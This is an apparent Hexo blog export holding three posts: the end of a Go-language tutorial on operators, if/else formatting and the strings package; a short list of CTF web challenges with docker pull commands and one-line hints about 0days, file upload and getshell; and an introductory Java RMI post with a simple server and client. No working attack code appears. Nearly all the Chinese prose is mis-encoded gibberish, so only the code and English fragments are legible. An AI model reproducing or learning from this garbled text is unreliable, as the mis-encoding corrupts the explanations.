<p>è¿™ä¸‰ä¸ªå¸ƒå°”è¿ç®—ç¬¦å„æœ‰ä¸åŒçš„<em>è¿ç®—ç¬¦ä¼˜å…ˆçº§</em>ã€‚å› æ­¤ï¼Œå®ƒä»¬æŒ‰ä»¥ä¸‹é¡ºåºè¿›è¡Œè¯„ä¼°ï¼š<code>!</code>é¦–å…ˆã€<code>&amp;&amp;</code>ç¬¬äºŒå’Œæœ€å<code>||</code>ã€‚å¦‚æœæ‚¨æƒ³å¼ºåˆ¶æ‰§è¡Œä¸åŒçš„é¡ºåºï¼Œæ‚¨å¯ä»¥å°†å¸ƒå°”è¡¨è¾¾å¼æ‹¬åœ¨åœ†æ‹¬å·ä¸­ï¼ˆå³ã€‚<code>()</code>ï¼‰ï¼Œå› ä¸ºåœ†æ‹¬å·å…·æœ‰æ›´é«˜çš„è¿ç®—ç¬¦ä¼˜å…ˆçº§ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">!<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>   <span class="comment">// =&gt; false</span></span><br><span class="line">!(<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>) <span class="comment">// =&gt; true</span></span><br></pre></td></tr></table></figure>

<h3 id="ifæ¡ä»¶è¯­å¥ä¹¦å†™è§„èŒƒ"><a href="#ifæ¡ä»¶è¯­å¥ä¹¦å†™è§„èŒƒ" class="headerlink" title="ifæ¡ä»¶è¯­å¥ä¹¦å†™è§„èŒƒ"></a>ifæ¡ä»¶è¯­å¥ä¹¦å†™è§„èŒƒ</h3><p>å¦‚æœä¹ æƒ¯ç”¨</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// do something1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆåœ¨<code>Go</code>è¿™é‡Œå°±è¡Œä¸é€šäº†ï¼Œå¦‚æœä½ æŒ‰ä¸Šé¢çš„æ ¼å¼è¿›è¡Œä¹¦å†™ï¼Œå°±ä¼šæŠ¥é”™</p>
<blockquote>
<p><code>unexpected else</code></p>
</blockquote>
<p>ä½ éœ€è¦æŒ‰ç…§ä½œè€…è§„å®šçš„æ ¼å¼ï¼Œæ‰ä¼šä½¿å¾—ä»£ç ä¸æ˜¾ç¤ºé”™è¯¯</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// do something1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>if+else if</code>ä¹Ÿæ˜¯å¦‚æ­¤</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> condition1 &#123;</span><br><span class="line">    <span class="comment">// do something1</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> condition2 &#123;</span><br><span class="line">    <span class="comment">// do something2</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// do something3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Go</code>çš„ä½œè€…è¿½æ±‚ç®€æ´ä¼˜é›…é«˜æ•ˆçš„ä»£ç æ ¼å¼ï¼Œæ‰€ä»¥é‡åˆ°è¿™ç§å½¢å¼ï¼Œåªèƒ½æŒ‰ä½œè€…çš„æ–¹å¼è¿›è¡Œç¼–å†™ï¼ˆæ— å¥ˆ</p>
<h2 id="å…³äºå­—ç¬¦ä¸²"><a href="#å…³äºå­—ç¬¦ä¸²" class="headerlink" title="å…³äºå­—ç¬¦ä¸²"></a>å…³äºå­—ç¬¦ä¸²</h2><p>Go ä¸­çš„<code>string</code>æ˜¯ä¸€ä¸ª<code>ä¸å¯å˜çš„å­—èŠ‚åºåˆ—</code>ï¼Œ<code>ä¸ä¸€å®šä»£è¡¨å­—ç¬¦</code>ã€‚</p>
<p>åŒå¼•å·ä¹‹é—´å®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦ä¸²æ–‡å­—ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&quot;Jane&quot;</span></span><br></pre></td></tr></table></figure>

<p>å­—ç¬¦ä¸²å¯ä»¥é€šè¿‡<code>+</code>è¿ç®—ç¬¦è¿æ¥èµ·æ¥ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Jane&quot;</span> + <span class="string">&quot; &quot;</span> + <span class="string">&quot;Austen&quot;</span></span><br><span class="line"><span class="comment">// =&gt; &quot;Jane Austen&quot;</span></span><br></pre></td></tr></table></figure>

<p>ä¸€äº›ç‰¹æ®Šå­—ç¬¦éœ€è¦ä½¿ç”¨å‰å¯¼åæ–œæ è¿›è¡Œè½¬ä¹‰ï¼Œä¾‹å¦‚<code>\t</code>åˆ¶è¡¨ç¬¦å’Œ<code>\n</code>å­—ç¬¦ä¸²ä¸­çš„æ–°è¡Œã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;How is the weather today?\nIt&#x27;s sunny&quot;</span>  </span><br><span class="line"><span class="comment">// =&gt;</span></span><br><span class="line"><span class="comment">// How is the weather today?</span></span><br><span class="line"><span class="comment">// It&#x27;s sunny</span></span><br></pre></td></tr></table></figure>

<p>è¯¥<code>strings</code>åŒ…åŒ…å«è®¸å¤šç”¨äºå¤„ç†å­—ç¬¦ä¸²çš„æœ‰ç”¨å‡½æ•°ã€‚æœ‰å…³å­—ç¬¦ä¸²å‡½æ•°çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹<a href="https://pkg.go.dev/strings">å­—ç¬¦ä¸²åŒ…æ–‡æ¡£</a>ã€‚è¿™é‡Œæœ‰äº›ä¾‹å­ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strings.ToLower returns the string given as argument with all its characters lowercased</span></span><br><span class="line">strings.ToLower(<span class="string">&quot;MaKEmeLoweRCase&quot;</span>)</span><br><span class="line"><span class="comment">// =&gt; &quot;makemelowercase&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strings.Repeat returns a string with a substring given as argument repeated many times</span></span><br><span class="line">strings.Repeat(<span class="string">&quot;Go&quot;</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">// =&gt; &quot;GoGoGo&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="å­—ç¬¦ä¸²åŒ…ï¼ˆstringsï¼‰"><a href="#å­—ç¬¦ä¸²åŒ…ï¼ˆstringsï¼‰" class="headerlink" title="å­—ç¬¦ä¸²åŒ…ï¼ˆstringsï¼‰"></a>å­—ç¬¦ä¸²åŒ…ï¼ˆstringsï¼‰</h2><h3 id="å…³äºå­—ç¬¦ä¸²åŒ…"><a href="#å…³äºå­—ç¬¦ä¸²åŒ…" class="headerlink" title="å…³äºå­—ç¬¦ä¸²åŒ…"></a>å…³äºå­—ç¬¦ä¸²åŒ…</h3><p>è¯¥<code>strings</code>åŒ…åŒ…å«è®¸å¤šç”¨äºå¤„ç†å­—ç¬¦ä¸²çš„æœ‰ç”¨å‡½æ•°ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line">strings.ToUpper(<span class="string">&quot;test&quot;</span>) <span class="comment">// =&gt; &quot;TEST&quot;</span></span><br></pre></td></tr></table></figure>

<p>å’Œ<code>java</code>ä¸­çš„åŒ…å¾ˆç›¸ä¼¼</p>
<blockquote>
<p>è®°å‡ ä¸ªå¸¸ç”¨çš„</p>
<p><code>strings.Repeat(str,num)</code>ï¼šé‡å¤strå­—ç¬¦numæ¬¡</p>
<p><code>strings.TrimSpace(str)</code>ï¼šæ¸…é™¤<code>str</code>å­—ç¬¦ä¸²<code>å·¦å³</code>è¾¹çš„ç©ºæ ¼</p>
<p><code>strings.TrimLeft/TrimRight(str,sign)</code>ï¼šæ¸…é™¤<code>str</code>å­—ç¬¦ä¸²<code>å·¦/å³</code>è¾¹çš„signç¬¦å·</p>
</blockquote>
]]></content>
      <categories>
        <category>è¯­è¨€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>goè¯­è¨€</tag>
      </tags>
  </entry>
  <entry>
    <title>Interesting Game wp</title>
    <url>//post/Interesting-Game-wp/</url>
    <content><![CDATA[<p><code>todoä¸Šçš„ä¸€äº›é¢˜ç›®</code></p>
<span id="more"></span>

<h1 id="XCTF-FINAL-2021"><a href="#XCTF-FINAL-2021" class="headerlink" title="XCTF FINAL 2021"></a>XCTF FINAL 2021</h1><h2 id="warmupcms"><a href="#warmupcms" class="headerlink" title="warmupcms"></a>warmupcms</h2><blockquote>
<p>é™„ä»¶çš„dockerå’Œé¢˜ç›®é™¤äº†flagä»¥å¤–å®Œå…¨ä¸€æ ·ï¼Œå»ºè®®å…ˆæœ¬åœ°æ‰“é€šå†æ‰“è¿œç¨‹ã€‚éœ€è¦å»åå°æ­£ç¡®è®¾ç½®é¢˜ç›®çš„urlä¸ºä½ å®é™…ç”¨çš„ip:portï¼Œå‰å°çš„css&#x2F;jsç­‰é™æ€æ–‡ä»¶æ‰èƒ½æ­£å¸¸æ˜¾ç¤ºï¼Œåå°æ˜¾ç¤ºæ˜¯æ­£å¸¸çš„ã€‚å¦‚æœæ˜¯æœ¬åœ°æ­ç¯å¢ƒï¼Œä½ å¯ä»¥ç›´æ¥ç¼–è¾‘sqlæ–‡ä»¶ä¿®æ”¹ï¼›å¦‚æœæ˜¯è¿œç¨‹ï¼Œå¯ä»¥ç™»å½•åˆ°åå°-ç³»ç»Ÿè®¾ç½®è¿›è¡Œä¿®æ”¹ã€‚</p>
<p>æœ‰ä¸€ä¸ª0dayï¼Œ5æœˆ31å·ä¿®å¤å®Œäº† è¿™ä¸ªdockeré‡Œè¿˜æ˜¯æœªä¿®å¤ç‰ˆæœ¬ </p>
<p>è¿˜æœ‰å¦å¤–ä¸€ä¸ª0day éƒ½å¯ä»¥getshell</p>
</blockquote>
<h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><blockquote>
<p>ä¸€ä¸ª0dayåœ¨åç«¯ æ–‡ä»¶ä¸Šä¼ </p>
<p>ä¸€ä¸ª0dayåœ¨å‰ç«¯æ–‡ä»¶ä¸Šä¼  éœ€è¦ä¼ªé€ jwt</p>
</blockquote>
<h1 id="GKCTF-2021"><a href="#GKCTF-2021" class="headerlink" title="GKCTF 2021"></a>GKCTF 2021</h1><h2 id="easycms-1"><a href="#easycms-1" class="headerlink" title="easycms"></a>easycms</h2><blockquote>
<p>å‚è€ƒ<a href="https://www.hacking8.com/bug-web/%E7%A6%85%E7%9F%A5/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell.html">ç¦…çŸ¥åå°getshell - ç¦…çŸ¥</a></p>
</blockquote>
<h1 id="å¼ºç½‘æ¯2021"><a href="#å¼ºç½‘æ¯2021" class="headerlink" title="å¼ºç½‘æ¯2021"></a>å¼ºç½‘æ¯2021</h1><h2 id="OA"><a href="#OA" class="headerlink" title="OA"></a>OA</h2><blockquote>
<p>ç›®æ ‡æ˜¯RCE</p>
<p>ä»…å®¹è®¸testç”¨æˆ·ç™»å…¥</p>
</blockquote>
<h2 id="mDNZ"><a href="#mDNZ" class="headerlink" title="mDNZ"></a>mDNZ</h2><blockquote>
<p>ç›®æ ‡æ˜¯rce</p>
<p>å¯ç™»é™†adminåå°</p>
</blockquote>
<h1 id="è™ç¬¦æ¯2022"><a href="#è™ç¬¦æ¯2022" class="headerlink" title="è™ç¬¦æ¯2022"></a>è™ç¬¦æ¯2022</h1><h2 id="easychain"><a href="#easychain" class="headerlink" title="easychain"></a>easychain</h2><blockquote>
<p>ç¯å¢ƒä¸å‡ºç½‘ï¼Œç›®æ ‡æ˜¯å‘½ä»¤æ‰§è¡Œå¹¶å›æ˜¾</p>
</blockquote>
<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><blockquote>
<p>mysqlå¯†ç åœ¨ç¯å¢ƒå˜é‡</p>
</blockquote>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">docker pull ccr<span class="selector-class">.ccs</span><span class="selector-class">.tencentyun</span>.com/cttf/hfctf-<span class="number">2022</span>-babysql ./<span class="selector-tag">main</span>.sh</span><br></pre></td></tr></table></figure>

<h1 id="ç¾å›¢CTF"><a href="#ç¾å›¢CTF" class="headerlink" title="ç¾å›¢CTF"></a>ç¾å›¢CTF</h1><h2 id="easycms-2"><a href="#easycms-2" class="headerlink" title="easycms"></a>easycms</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> pull y4tacker/ez_yxcms:<span class="number">1</span>.<span class="number">0</span> </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaå®‰å…¨[RMI(1)]</title>
    <url>//post/Java%E5%AE%89%E5%85%A8%5BRMI(1)%5D/</url>
    <content><![CDATA[<p>ç†Ÿæ‚‰çš„åå­—ï¼Œåœ¨CVEå­¦ä¹ ä¸­ï¼Œå…¶ä¸­<code>Apache solr</code> çš„<code>log4j</code>æ¼æ´å’Œ<code>weblogic</code>è¿œç¨‹ä»£ç æ‰§è¡Œéƒ½æåˆ°äº†<code>RMI</code>ï¼Œä½œç”¨å¦‚åï¼Œ <code>RMIï¼ˆremote method invocationï¼‰</code>å³<code>è¿œç¨‹æ–¹æ³•è°ƒç”¨</code>ã€‚</p>
<span id="more"></span>

<h1 id="Javaå®‰å…¨-RMI-1"><a href="#Javaå®‰å…¨-RMI-1" class="headerlink" title="Javaå®‰å…¨[RMI(1)]"></a>Javaå®‰å…¨[RMI(1)]</h1><p><code>RMI</code>çš„ç›®æ ‡å…¶å®å’Œ<code>RPC</code>ç±»ä¼¼ï¼Œæ˜¯è®©æŸä¸ª<code>Java</code>è™šæ‹Ÿæœºä¸Šçš„å¯¹è±¡è°ƒç”¨å¦ä¸€ä¸ª<code>Java</code>è™šæ‹Ÿæœºä¸Šçš„æ–¹æ³•ï¼Œåªä¸è¿‡<code>RMI</code>æ˜¯<code>Java</code>ä¸­ç‹¬æœ‰çš„ä¸€ç§æœºåˆ¶ã€‚</p>
<blockquote>
<p><code>RPCï¼ˆRemote Procedure Callï¼‰</code>æ˜¯<code>è¿œç¨‹è¿‡ç¨‹è°ƒç”¨åè®®</code>ï¼Œæ˜¯ä¸€ç§é€šè¿‡ç½‘ç»œä»è¿œç¨‹è®¡ç®—æœºç¨‹åºä¸Šè¯·æ±‚æœåŠ¡ï¼Œè€Œä¸éœ€è¦äº†è§£åº•å±‚ç½‘ç»œæŠ€æœ¯çš„åè®®ã€‚</p>
<p>åœ¨åˆ†å¸ƒå¼è®¡ç®—ä¸­ï¼ŒRPCå…è®¸è¿è¡Œäºä¸€å°è®¡ç®—æœºçš„ç¨‹åºè°ƒç”¨å¦ä¸€ä¸ªåœ°å€ç©ºé—´çš„å­ç¨‹åºï¼Œè€Œç¨‹åºå‘˜å°±åƒè°ƒç”¨æœ¬åœ°ç¨‹åºä¸€æ ·ï¼Œæ— éœ€é¢å¤–åœ°ä¸ºè¿™ä¸ªäº¤äº’ä½œç”¨ç¼–ç¨‹ã€‚RPCæ˜¯ä¸€ç§<code>CS</code>æ¨¡å¼ï¼Œç»å…¸å®ç°æ˜¯ä¸€ä¸ªé€šè¿‡<code>å‘é€è¯·æ±‚-æ¥å—å›åº”</code>è¿›è¡Œä¿¡æ¯äº¤äº’çš„ç³»ç»Ÿã€‚</p>
</blockquote>
<p>æ—¢ç„¶æ˜¯è¿œç¨‹è°ƒç”¨ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯å­˜åœ¨è°è°ƒç”¨è°çš„å…³ç³»ï¼Œè¿™å°±æ„æˆäº†<code>RMI Server</code>å’Œ<code>RMI Client</code>ï¼Œåœ¨<code>Server</code>ä¸­å®ç°è¿œç¨‹è°ƒç”¨çš„å‡½æ•°å’Œæ¥å£ï¼Œè€Œ<code>Client</code>éœ€è¦çŸ¥é“æƒ³è¦è°ƒç”¨æ–¹æ³•çš„æ¥å£ï¼Œç„¶åè®¿é—®æ‰§è¡Œå³å¯ã€‚</p>
<h2 id="RMIServer"><a href="#RMIServer" class="headerlink" title="RMIServer"></a>RMIServer</h2><p>â¼€ä¸ª<code>RMI Server</code>åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š</p>
<blockquote>
<ol>
<li>â¼€ä¸ªç»§æ‰¿äº† <code>java.rmi.Remote</code> çš„æ¥â¼ï¼Œå…¶ä¸­å®šä¹‰æˆ‘ä»¬è¦è¿œç¨‹è°ƒâ½¤çš„å‡½æ•°ï¼Œâ½å¦‚è¿™â¾¥çš„ <code>hello()</code> </li>
<li>â¼€ä¸ªå®ç°äº†æ­¤æ¥â¼çš„ç±»</li>
<li>â¼€ä¸ªä¸»ç±»ï¼Œâ½¤æ¥åˆ›å»º<code>Registry</code>ï¼Œå¹¶å°†ä¸Šâ¾¯çš„ç±»å®ä¾‹åŒ–åç»‘å®šåˆ°â¼€ä¸ªåœ°å€ã€‚è¿™å°±æ˜¯æˆ‘ä»¬æ‰€è°“çš„<code>Server</code> äº†ã€‚</li>
</ol>
</blockquote>
<p>å…ˆç¼–å†™ä¸€ä¸ª<code>RMI Server</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_1;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">        String <span class="title function_">hello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span></span><br><span class="line">            <span class="title class_">IRemoteHelloWorld</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span>+s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ†æä¸€ä¸‹ä»£ç ï¼Œ</p>
<ol>
<li>æ¥å£å®šä¹‰</li>
</ol>
<p>å…ˆå®šä¹‰ä¸€ä¸ªåä¸º<code>IRemoteHelloWorld</code>çš„æ¥å£ï¼Œå®ƒæ‰©å±•äº†<code>Remote</code>æ¥å£ï¼Œè¿™æ˜¯<code>RMI</code>ä¸­çš„ä¸€ä¸ªæ ‡è®°æ¥å£ã€‚æ¥å£å£°æ˜äº†ä¸€ä¸ª<code>hello()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¯ä»¥æŠ›å‡º<code>RemoteException</code>å¼‚å¸¸ï¼Œè¿™ä¸ªæ¥å£å®šä¹‰äº†ä¸€ä¸ªè¿œç¨‹æ–¹æ³•ï¼Œå®¢æˆ·ç«¯å¯ä»¥é€šè¿‡<code>RMI</code>è°ƒç”¨å®ƒã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>è¿œç¨‹å¯¹è±¡çš„å®ç°</li>
</ol>
<p>è¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªåä¸º<code>RemoteHelloWorld</code>ç±»ï¼Œå®ç°äº†<code>IRemoteHelloWorld</code>æ¥å£å¹¶ç»§æ‰¿<code>UnicastRemoteObject</code>ç±»ã€‚è¿™ä¸ªç±»çš„æ„é€ å‡½æ•°è°ƒç”¨çˆ¶ç±»ï¼Œä¹Ÿå°±æ˜¯<code>UnicastRemoteObject</code>ç±»çš„æ„é€ å‡½æ•°ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªè¿œç¨‹å¯¹è±¡ã€‚<code>RemoteHelloWorld</code>è¿˜å®ç°äº†<code>hello()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¥–æ‰“å°ä¸€æ¡æ¶ˆæ¯<code>call from</code>ï¼Œå¹¶è¿”å›<code>Hello World</code>ç»™è°ƒç”¨è¯¥æ–¹æ³•çš„å¯¹è±¡(å¦‚ï¼Œå®¢æˆ·ç«¯æœåŠ¡å™¨)ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span></span><br><span class="line">        <span class="title class_">IRemoteHelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span>+s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>å¯åŠ¨RMIæœåŠ¡å™¨æ–¹æ³•å®šä¹‰å’Œæ‰§è¡Œ</li>
</ol>
<p><code>start()</code> æ–¹æ³•ç”¨äºå¯åŠ¨<code>RMI</code>æœåŠ¡å™¨ã€‚</p>
<ul>
<li>åˆ›å»ºä¸€ä¸ª <code>RemoteHelloWorld</code> å®ä¾‹ <code>h</code>ï¼Œè¿™ä¸ªå®ä¾‹å°†å……å½“è¿œç¨‹å¯¹è±¡ã€‚</li>
<li>é€šè¿‡ <code>LocateRegistry.createRegistry(1099)</code> åˆ›å»ºäº†ä¸€ä¸ª<code>RMI</code>æ³¨å†Œè¡¨ï¼Œå¹¶æŒ‡å®šå®ƒç›‘å¬åœ¨<code>1099</code>ç«¯å£ä¸Šã€‚</li>
<li>ä½¿ç”¨ <code>Naming.rebind()</code> å°†è¿œç¨‹å¯¹è±¡ <code>h</code> ç»‘å®šåˆ°äº† <code>rmi://127.0.0.1:1099/Hello</code> è¿™ä¸ªåç§°ä¸‹ã€‚</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>mainæ–¹æ³•</li>
</ol>
<p>åˆ›å»º<code>RMIServer</code>çš„å®ä¾‹ï¼Œå¹¶è°ƒç”¨<code>start()</code>æ–¹æ³•å¯åŠ¨<code>RMIServer</code>ã€‚</p>
<h2 id="RMIClient"><a href="#RMIClient" class="headerlink" title="RMIClient"></a>RMIClient</h2><p>RMIå®¢æˆ·ç«¯ç›¸æ¯”äºRMIæœåŠ¡ç«¯çš„ä»£ç å°±ç®€å•ä¸€ç‚¹ï¼Œåªéœ€è¦è®¿é—®è°ƒç”¨æœåŠ¡ç«¯çš„è¿œç¨‹æ–¹æ³•å³å¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_1;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        RMIServer.<span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIServer.IRemoteHelloWorld)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://10.19.16.44:1099/Hello&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> hello.hello(<span class="string">&quot;Ttoc&quot;</span>);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå±•ç¤ºçš„åªæ˜¯æœ¬åœ°è¿›è¡Œè°ƒç”¨<code>RMIServer</code>ï¼Œè¦å®ç°çœŸæ­£çš„<code>RMI</code>ï¼Œå®¢æˆ·ç«¯éœ€è¦æœåŠ¡ç«¯æä¾›æ¥å£å®ç°æ–¹å¼ï¼Œå¦‚ä¸Šé¢ä»£ç æ‰€ç¤ºçš„<code>IRemoteHelloWorld</code>ï¼Œä¸€èˆ¬ä¸ä¼šæŠŠæ¥å£å’Œå®ç°éƒ½åŒ…å«åœ¨ä¸€ä¸ªç±»ä¸­ï¼Œè€Œæ˜¯åˆ†å¼€å¤šä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯ä¸ºäº†æ–¹ä¾¿ã€‚</p>
<p>å®¢æˆ·ç«¯åªéœ€è¦æ¥å£æ‰“åŒ…æˆ<code>jar</code>ï¼Œè¿™æ ·å°±èƒ½çŸ¥é“<code>RMI</code>å¯ä»¥è°ƒç”¨çš„æ–¹æ³•æœ‰å“ªäº›ï¼Œå¹¶çŸ¥é“æœåŠ¡ç«¯çš„<code>ip</code>å’Œç«¯å£å³å¯ï¼Œç„¶åä½¿â½¤ <code>Naming.lookup</code> åœ¨<code>Registry</code>ä¸­å¯»æ‰¾åˆ°åå­—æ˜¯<code>Hello</code>çš„å¯¹è±¡ï¼Œåâ¾¯çš„ä½¿â½¤å°±å’Œåœ¨æœ¬åœ°ä½¿â½¤â¼€æ ·äº†ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230913101103425.png" alt="image-20230913101103425"></p>
<p><code>jar</code>æ‰“åŒ…å‘½ä»¤ï¼Œè¿™å°±å®ç°äº†æŠŠæ¥å£æ‰“åŒ…çš„ç»“æœ</p>
